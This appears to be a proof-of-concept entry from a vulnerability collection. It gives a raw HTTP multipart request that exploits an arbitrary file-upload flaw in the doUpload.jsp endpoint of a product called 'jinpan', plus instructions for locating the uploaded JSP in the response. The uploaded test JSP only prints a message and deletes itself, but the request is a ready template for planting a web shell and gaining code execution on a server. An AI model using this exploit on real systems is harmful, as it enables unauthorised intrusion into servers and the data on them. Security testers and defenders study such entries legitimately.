# jinpan_doUpload_fileupload
2024/1/29 @2

from: https://mp.weixin.qq.com/s/4ZFlMN8qwKHnz08B67WqvQ


```
POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5iALAXlSiqxJXrhK
 
------WebKitFormBoundary5iALAXlSiqxJXrhK
Content-Disposition: form-data; name="file";filename="ceshi.jsp"
 
<% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundary5iALAXlSiqxJXrhK--
```

check response to get filepath
/upload/2024-xx-xx/xxx.jsp
